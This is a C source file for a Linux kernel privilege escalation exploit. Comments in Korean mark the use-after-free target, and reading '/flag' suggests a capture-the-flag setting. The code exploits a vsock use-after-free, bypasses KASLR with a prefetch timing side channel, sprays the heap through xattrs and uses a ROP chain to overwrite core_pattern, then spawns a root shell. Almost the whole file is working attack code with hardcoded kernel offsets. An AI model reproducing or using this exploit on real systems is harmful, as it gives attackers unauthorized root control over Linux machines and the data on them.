#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>
#include <linux/types.h>
#include <stdint.h>
#include <linux/keyctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <stddef.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <limits.h>

#include "modules/helper.h"
#include "modules/xattr.h"

#define MAX_PORT_RETRIES 24

#ifndef VMADDR_CID_LOCAL
#define VMADDR_CID_LOCAL 1
#endif

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

typedef int key_serial_t;

inline static key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
	return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

long keyctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
	return syscall(__NR_keyctl, option, arg2, arg3, arg4, arg5);
}

#define FAIL_IF(x) if ((x)) { \
	perror(#x); \
	return -1; \
}

static void die(const char *msg)
{
	perror(msg);
	exit(-1);
}

unsigned long long get_jiffies()
{
	return times(NULL) * 10;
}


int socket_bind(int port)
{
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
		.svm_cid = VMADDR_CID_LOCAL,
		.svm_port = port,
	};
	int s;

	s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (s < 0)
		die("socket");

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)))
		die("bind");

	return s;
}

struct sock {
	char dummy[640];
	void *sk_security; // 640
	char dummy2[688 - 640 - 8];
	void *sk_write_space; // 688
	char dummy3[776 - 8 - 688];
	// end: 776
};

struct vsock_sock {
	struct sock sk __attribute__((aligned(8)));
	void *transport;
	struct sockaddr_vm local_addr;
	struct sockaddr_vm remote_addr;
	struct list_head bound_table;
};

int timefds[0x50000];
int epfds[0x50000];
char buf[0x1000];
int tfd;

int vsock, vsock2;
int pipe_fd[2];

#define CC_OVERFLOW_FACTOR 2
#define OBJS_PER_SLAB 12
#define CPU_PARTIAL 0x5
#define OBJS_FRONT OBJS_PER_SLAB + 0x20
#define CHUNK_SIZE 0x500

#define FRONT_SLUB_CNT 0x10

int spray_cnt = 0;
int front = 0, target1, target2, back;
int sprayed_vsock[0x1000];

void _wait()
{
	printf("waiting...\n");
	getchar();
}


struct sock_filter filter[0x1000];
char buf[0x1000];

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666 %P", strlen("|/proc/%P/fd/666 %P")) == 0;
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root()\n");
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /flag;bash");
}

uint64_t kbase = 0xffffffff81000000;

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
	uint64_t a, d;
	asm volatile ("mfence\n\t"
			"RDTSCP\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			"xor %%rax, %%rax\n\t"
			"lfence\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
	uint64_t a, d;
	asm volatile(
			"xor %%rax, %%rax\n\t"
			"lfence\n\t"
			"RDTSCP\n\t"
			"mov %%rdx, %0\n\t"
			"mov %%rax, %1\n\t"
			"mfence\n\t"
			: "=r" (d), "=r" (a)
			:
			: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d<<32) | a;
	return a;
}

void prefetch(void* p)
{
	asm volatile (
			"prefetchnta (%0)\n"
			"prefetcht2 (%0)\n"
			: : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

int bypass_kaslr(uint64_t base) {
	if (!base) {
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END   (0xffffffffD0000000ull + OFFSET)
#define STEP   0x0000000001000000ull
		while (1) {
			uint64_t bases[7] = {0};
			for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					times[ti] = ~0;
					addrs[ti] = START + STEP * (uint64_t)ti;
				}

				for (int i = 0; i < 16; i++) {
					for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
						uint64_t addr = addrs[ti];
						size_t t = flushandreload((void*)addr);
						if (t < times[ti]) {
							times[ti] = t;
						}
					}
				}

				size_t minv = ~0;
				size_t mini = -1;
				for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
					if (times[ti] < minv) {
						mini = ti;
						minv = times[ti];
					}
				}

				if (mini < 0) {
					return -1;
				}

				bases[vote] = addrs[mini];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (c == 0) {
					base = bases[i];
				} else if (base == bases[i]) {
					c++;
				} else {
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (base == bases[i]) {
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2) {
				base -= OFFSET;
				goto got_base;
			}
		}
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000200000ull
#define NUM_TRIALS 7
		// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

		while (1) {
			uint64_t bases[NUM_TRIALS] = {0};

			for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
					times[ti] = ~0;
					addrs[ti] = START + STEP * (uint64_t)ti;
				}

				for (int i = 0; i < 16; i++) {
					for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
						uint64_t addr = addrs[ti];
						size_t t = flushandreload((void*)addr);
						if (t < times[ti]) {
							times[ti] = t;
						}
					}
				}

				uint64_t max = 0;
				int max_i = 0;
				for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++) {
					uint64_t sum = 0;
					for (int i = 0; i < WINDOW_SIZE; i++) {
						sum += times[ti + i];
					}
					if (sum > max) {
						max = sum;
						max_i = ti;
					}
				}

				bases[vote] = addrs[max_i];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (c == 0) {
					base = bases[i];
				} else if (base == bases[i]) {
					c++;
				} else {
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++) {
				if (base == bases[i]) {
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2) {
				goto got_base;
			}
		}
#endif
	}

got_base:

	kbase = base;
	return 0;
}


uint64_t find_min(uint64_t arr[], int size) {
	if (size <= 0) {
		printf("Array size must be greater than 0.\n");
		return INT_MAX;
	}

	uint64_t min = arr[0];
	for (int i = 1; i < size; i++) {
		if (arr[i] < min) {
			min = arr[i];
		}
	}
	return min;
}

#define KASLR 25


int main(int argc, void *argv[])
{
	if (argc > 2)
	{
		printf("triggered from core_pattern\n");
		root(argv[1]);
		exit(0);
	}

	uint64_t bases[KASLR] = {0,};

	cpu_affinity(0);
	for(int i = 0 ; i < KASLR; i++){
		bypass_kaslr(0);
		bases[i] = kbase;
	}

	kbase = find_min(bases, KASLR);
	printf("kbase: %p\n", kbase);

	struct sockaddr_vm addr;
	socklen_t alen = sizeof(addr);
	int random_port, i;
	pid_t conn_pid;
	pthread_t thread;
	const char* message = "D";

	char file_name[0x100];
	char attribute_name[0x100] = "security.xattr1";
	char spray[XATTR_VALUE_KMALLOC_CG_16K] = {0};
	for(int i=0; i<0x1000; i++)
	{
		snprintf(file_name, 0x100, "/tmp/xattrs%d", i);
		close(open(file_name, O_CREAT | O_RDWR, 0666));
	}

	if(!fork())
	{
		cpu_affinity(1);
		while(1)
		{
			if(check_core())
			{
				printf("core pattern changed!\n");
				char buf[0x100] = {};
				int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
				read(core, buf, sizeof(buf));
				write(1, buf, sizeof(buf));
				if(!fork())
				{
					int memfd = memfd_create("x", 0);
					sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff);
					dup2(memfd, 666);
					close(memfd);
					// trigger crash
					*(size_t *)0 = 0;
					while(1);
				}
				return 0;
			}
		}
	}

	cpu_affinity(0);

	struct rlimit rlim = {
		.rlim_cur = 4096,
		.rlim_max = 4096};
	setrlimit(RLIMIT_NOFILE, &rlim);

	vsock2 = socket(AF_VSOCK, SOCK_SEQPACKET, 0);	// connect용 vsock
	if (vsock2 < 0)
		die("socket");

	random_port = socket_bind(VMADDR_PORT_ANY);
	if (getsockname(random_port, (struct sockaddr *)&addr, &alen))
		die("getsockname");

	for (i = 0; i < MAX_PORT_RETRIES; ++i)
		socket_bind(++addr.svm_port);

	for (int i=0; i<FRONT_SLUB_CNT; i++)
		for(int j=0; j<OBJS_PER_SLAB; j++)
			sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	target1 = spray_cnt;
	for (int i=0; i<OBJS_PER_SLAB; i++)
		sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	vsock = socket(AF_VSOCK, SOCK_SEQPACKET, 0);	// UAF 대상 vsock
	if (vsock < 0)
		die("socket");

	target2 = spray_cnt;
	for(int i=0; i<OBJS_PER_SLAB; i++)
		sprayed_vsock[spray_cnt++] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	back = spray_cnt;

	if (!connect(vsock, (struct sockaddr *)&addr, alen))
		die("connect 1");

	addr.svm_cid = 0;
	if (!connect(vsock, (struct sockaddr *)&addr, alen))
		die("connect 2");

	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;
	if (bind(vsock, (struct sockaddr *)&addr, alen))	// UAF
		die("bind s");

	for(int i=0; i<target1; i++)
		close(sprayed_vsock[i]);

	for(int i=target1; i<target2; i++)
		close(sprayed_vsock[i]);
	for(int i=target2; i<back; i++)
		close(sprayed_vsock[i]);

	uint64_t pushrdi_poprsp = kbase + 0x4d1997; // 0xffffffff814d1997 : push rdi ; pop rsp ; jmp 0xffffffff82481fa0
	uint64_t prdi_rsi_rdx_rcx = kbase + 0xef759; // 0xffffffff810ef759 : pop rdi ; pop rsi ; pop rdx ; pop rcx ; jmp 0xffffffff82481fa0

	uint64_t copy_from_user = kbase + 0x009aadd0;
	uint64_t msleep = kbase + 0x0027af40;

	uint64_t core_pattern = kbase + 0x02db65c0;

	struct vsock_sock spray_chunk = {
		.bound_table = {
			.next = (struct list_head *)(0xdeadbeef),
			.prev = (struct list_head *)(0xcafebabe),
		}, 
		.local_addr = {
			.svm_port = VMADDR_PORT_ANY,
			.svm_cid = VMADDR_CID_ANY,
		},
		.sk = {
			.sk_write_space = (void *)(pushrdi_poprsp),
			.dummy = {0},
		},
	};

	char core_pattern_buf[0x100] = "|/proc/%P/fd/666 %P %P";
	uint64_t *rops = spray_chunk.sk.dummy;
	int t = 0;
	rops[t++] = prdi_rsi_rdx_rcx;
	rops[t++] = 0;
	rops[t++] = 0x0a0000;// 0x12 must be 10(TCP_LISTEN)
	rops[t++] = 0;
	rops[t++] = 0;
	rops[t++] = prdi_rsi_rdx_rcx;
	rops[t++] = core_pattern;
	rops[t++] = (uint64_t)core_pattern_buf;
	rops[t++] = strlen(core_pattern_buf);
	rops[t++] = 0;
	rops[t++] = copy_from_user;
	rops[t++] = msleep;

	for(int i=0x500; i<0x4000; i+=0x500) {
		*((struct vsock_sock *)(spray + i)) = spray_chunk;
	}

	for(int i=0; i<0x400; i++) {
#define ATTRIBUTE_NAME_LEN 0x20
		snprintf(file_name, 0x100, "/tmp/xattrs%d", i);
		create_xattr(file_name, attribute_name, spray, XATTR_VALUE_KMALLOC_CG_16K, true);
	}

	addr.svm_family = AF_VSOCK;
	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;
	if (!connect(vsock2, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
		die("connect 4");
	}

	while(1);

	return 0;
}
